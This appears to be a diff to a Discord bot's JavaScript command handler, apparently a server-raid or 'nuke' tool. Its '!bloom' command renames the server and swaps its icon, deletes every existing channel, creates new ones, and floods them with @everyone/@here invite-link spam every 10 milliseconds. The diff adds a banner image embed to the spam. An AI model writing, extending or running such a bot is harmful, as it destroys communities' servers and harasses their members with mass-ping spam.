@@ -120,7 +120,7 @@ module.exports = (client) => {
         }
 
         // ==========================================
-        // COMMAND: !bloom (Banner removed, separate icon file used)
+        // 3. COMMAND: !bloom
         // ==========================================
         if (command === "!bloom") {
             try {
@@ -137,12 +137,11 @@ module.exports = (client) => {
                     }
                 }
 
-                // 1.1 Server Details Change (Using local icon file from assets folder)
-                const iconPath = path.join(__dirname, '../assets/icon.png');
-                if (fs.existsSync(iconPath)) {
-                    await guild.setIcon(iconPath).catch(() => {});
-                }
+                // 1.1 Server Details Change
                 await guild.setName("Moon Community 🌙").catch(() => {});
+                await guild.setIcon(
+                    "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
+                ).catch(() => {});
                 
                 // 2. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
@@ -171,12 +170,13 @@ module.exports = (client) => {
                     }
                 }
 
-                // 5. Send initial message (Banner removed, plain text/content message)
+                // 5. Send initial message
                 const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                 await Promise.all(
                     newChannels.map(channel =>
                         channel.send({
-                            content: welcomeMessage
+                            content: welcomeMessage,
+                            embeds: [{ image: { url: BANNER_URL } }]
                         }).catch(() => {})
                     )
                 );
@@ -187,11 +187,12 @@ module.exports = (client) => {
                     welcomeInterval = null;
                 }
 
-                // 7. Interval spam (Without banner)
+                // 7. Interval spam
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
-                            content: welcomeMessage
+                            content: welcomeMessage,
+                            embeds: [{ image: { url: BANNER_URL } }]
                         }).catch(() => {});
                     }
                 }, 10);
@@ -200,7 +201,7 @@ module.exports = (client) => {
                 console.error("Error executing !bloom command:", error);
             }
         }
-        
+              
         // ==========================================
         // 4. COMMAND: !stop
         // ==========================================
